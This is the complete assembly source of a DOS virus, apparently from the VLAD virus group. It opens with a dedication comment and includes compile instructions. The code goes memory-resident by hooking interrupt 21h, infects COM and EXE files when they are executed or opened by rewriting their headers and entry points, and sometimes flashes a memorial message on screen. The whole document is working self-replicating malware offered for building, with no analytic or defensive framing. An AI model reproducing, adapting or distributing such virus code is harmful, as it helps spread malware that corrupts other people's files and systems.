; RIP TerminatorZ
;
; This virus is dedicated to the great TerminatorZ who recently died of an
; overdose.  I was, I guess you can say, friends with TZ and nearly ended up
; living with the guy.  He had high prospects in both the virus world and in
; his chosen field of expertise, biochemistry, but he got on the drug
; landslide.  It's a pitty and a waste.  We'll miss ya man.
;
; The virus is a com/exe-hdr int 21 resident infector.
; It displays a message.
;
; compile with a86 and rename the .bin to .com (479 bytes)
;
; Quantum / VLAD
;
org 0
vstart:
mov ax,1801h
int 21h

db 0bbh
delta dw 100h

or al,al
jnz ret2host

push es

mov ax,20h
mov es,ax
mov si,bx
xor di,di
mov cx,offset daend
rep movsb

mov ds,cx
mov si,84h
mov di,offset oi21
movsw
movsw
mov word ptr [si-4],offset i21
mov word ptr [si-2],ax

pop es

ret2host:
comorexe db 0ebh
db offset comret-offset exeret
exeret:
push cs
pop ax
db 05h
orgcs dw 0
push ax
db 0b8h
orgip dw 0
push ax
retf

comret:
mov di,100h
push di
db 0b8h
retbytes1 dw 20cdh
stosw
db 0b8h
retbytes2 db 90h,'Z'
stosw
ret

payload:
push ds
push es
push dx
push cx
push si
push di
push ax
push cs
pop ds
in al,40h
cmp al,8
jnz endpayload
mov ax,0b800h
mov es,ax
mov di,160*24+80-16
mov cx,15
mov si,offset msg
flashloop:
movsb
mov al,1fh
stosb
loop flashloop
endpayload:
pop ax
pop di
pop si
pop cx
pop dx
pop es
pop ds
jmp gooldint

msg db "R","I","P"," ","T","e","r","m","i","n","a","t","o","r","Z"

i21:
cmp ax,1801h
jnz notserv
iret
notserv:
cmp ax,4b00h
jz infectit
cmp ah,3dh
jz infectit
cmp ah,4ch
jz payload
gooldint:
db 0eah
oi21 dw 0,0

int21:
pushf
call dword ptr cs:[offset oi21]
ret

infectit:
push ax
push bx
push cx
push dx
push si
push di
push ds
push es
mov si,dx
findloop:
lodsb
or al,al
jnz findloop
cmp word ptr [si-3],"MO"
jz goon
cmp word ptr [si-3],"EX"
jz goon
jmp noinfect
goon:
mov ax,3d02h
call int21
xchg bx,ax
push cs
pop ds
mov dx,offset retbytes1
mov di,dx
call read2
cmp word ptr [di],"MZ"
jz infectexe
cmp word ptr [di],"ZM"
jz infectexe
infectcom:
mov dx,offset retbytes2
mov di,dx
call read2
cmp byte ptr [di+1],"Z"
jnz goon1
goout:
jmp aftinfect
goon1:
mov byte ptr [offset comorexe],0ebh
mov ax,04202h
xor cx,cx
xor dx,dx
call int21
or dx,dx
jnz goout
cmp ah,5
jb goout
mov [offset delta],ax
add [offset delta],100h
dec ax
dec ax
dec ax
push ax
call writeall
xor dx,dx
call setp
mov si,offset tmpspace
pop [si]
mov ah,40h
mov cx,4
mov dx,offset topcode
call int21
jmp aftinfect
infectexe:
mov dx,8
call setp
mov dx,si
call read2
mov ax,[si]
cmp ax,20h
jnz aftinfect
mov di,offset daend/16+1
sub ax,di
mov [si],ax
mov dx,8
call setp
mov dx,si
call write2
mov dx,14h
call setp
mov dx,offset orgip
call read2
mov dx,offset orgcs
call read2
add word ptr [offset orgcs],di
mov dx,0eh
call setp
mov dx,si
call read2
add word ptr [si],di
mov dx,0eh
call setp
mov dx,offset tmpspace
call write2
mov dx,14h
call setp
mov word ptr [si],dx
mov word ptr [offset delta],dx
mov byte ptr [offset comorexe],0e4h
mov dx,si
call write2
mov dx,si
call write2
mov dx,(20h-(offset daend/16+1))*16
call setp
call writeall
aftinfect:
mov ah,3eh
call int21
noinfect:
pop es
pop ds
pop di
pop si
pop dx
pop cx
pop bx
pop ax
jmp gooldint

writeall:
mov ah,40h
mov cx,offset daend
xor dx,dx
call int21
ret

read2:
mov ah,3fh
midread:
mov cx,2
call int21
ret

write2:
mov ah,40h
jmp midread

setp:
mov ax,04200h
xor cx,cx
call int21
ret

topcode db 0e9h
tmpspace dw 0
db 'Z'

daend:
